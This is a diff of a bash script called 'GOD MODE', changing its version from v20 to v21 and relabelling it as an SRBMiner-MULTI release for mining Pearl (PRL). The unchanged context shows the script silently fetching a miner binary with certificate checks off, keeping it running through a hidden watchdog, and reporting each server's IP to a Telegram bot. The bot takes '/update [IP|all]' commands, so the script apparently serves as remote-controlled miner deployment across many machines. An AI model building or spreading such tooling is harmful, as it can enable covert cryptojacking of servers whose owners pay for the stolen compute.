@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v20: CRONTAB FIX & CLEAN ASCII TERMINAL OUTPUT  |
+# | GOD MODE v21: SRBMiner-MULTI PEARL (PRL) FULL RELEASE    |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -114,7 +114,7 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup
+# GPU Setup (SRBMiner-MULTI for Pearl)
 if [ "$HAS_GPU" -eq 1 ] && [ ! -f "$BIN_GPU" ]; then
     curl -L -k -s -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz "$URL_SRBMINER"
     tar -xf gpu.tar.gz 2>/dev/null
@@ -285,7 +285,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V20 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V21 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -407,7 +407,7 @@ nohup ./watchdog.sh >/dev/null 2>&1 &
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V20 INITIALIZED"
+echo "[+] ENGINE V21 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
